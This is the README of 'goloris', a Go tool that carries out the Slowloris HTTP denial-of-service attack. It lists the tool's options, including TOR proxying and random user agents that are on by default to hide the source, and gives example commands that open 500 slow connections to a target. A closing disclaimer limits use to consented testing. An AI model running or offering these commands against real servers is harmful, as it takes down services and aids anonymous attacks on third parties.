goloris
=======

[Slowloris HTTP DoS](http://ckers.org/slowloris/) implementation in golang with TOR support (with SOCKS5 proxy mode) and random User Agent.

```
usage: ./goloris [OPTIONS]... TARGET
  TARGET host:port. port 80 is assumed for HTTP connections. 443 is assumed for HTTPS connections

OPTIONS
  -connections int
    	Number of active concurrent connections (default 10)
  -dosHeader string
    	Header to send repeatedly (default "Cookie: a=b")
  -finishafter duration
    	Seconds to wait before finishing the request. If zero the request is never finished
  -https
    	Use HTTPS
  -interval duration
    	Duration to wait between sending headers (default 1s)
  -method string
    	HTTP method to use (default "GET")
  -quiet
    	forward stdout to /dev/null
  -randomAgent
    	Use a random user agent on each request (default true)
  -resource string
    	Resource to request from the server (default "/")
  -timeout duration
    	HTTP connection timeout in seconds (default 1m0s)
  -timermode
    	Measure the timeout of the server. connections flag is omitted
  -tor
    	Use TOR SOCKS5 proxy (default true)
  -toraddress string
    	TOR SOCKS5 proxy address (default "127.0.0.1:9050")
  -useragent string
    	User-Agent header of the request (default "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)")

EXAMPLES
  ./goloris -connections=500 192.168.0.1
  ./goloris -https -connections=500 192.168.0.1
  ./goloris -randomAgent=0 -useragent="some user-agent string" -https -connections=500 192.168.0.1


Usage of this program for attacking targets without prior mutual consent is
illegal. It is the end user's responsibility to obey all applicable local, 
state and federal laws. Developers assume no liability and are not 
responsible for any misuse or damage caused by this program.

This disclaimer was shamelessy copied from sqlmap with minor modifications :)
```
